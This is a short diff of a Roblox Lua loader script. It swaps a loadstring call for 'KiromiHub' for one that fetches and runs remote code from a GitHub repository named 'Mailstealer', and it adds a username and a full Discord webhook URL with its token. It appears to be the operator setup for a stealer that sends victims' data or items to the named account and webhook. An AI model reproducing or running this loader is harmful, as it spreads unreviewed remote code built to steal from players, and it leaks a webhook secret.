@@ -1,2 +1,4 @@
-local user = "Ahmad147385" --Put your name
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MysteriousConrad1/KiromiHub/main/main.lua"))()
+Username = "Ahmad147385" -- Your nick
+Webhook = "https://discord.com/api/webhooks/1196425982324781056/2IcSTe2d_QPDaKHNds2yCxKChf2pvEq7FV9yH-ul63yucEXwjb72JAiw-8chAX23X7sx" -- Your webhook
+LoadingScreen = true -- You can off loadingscreen, need change to false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MailstealerV2/Mailstealer/main/v2"))()
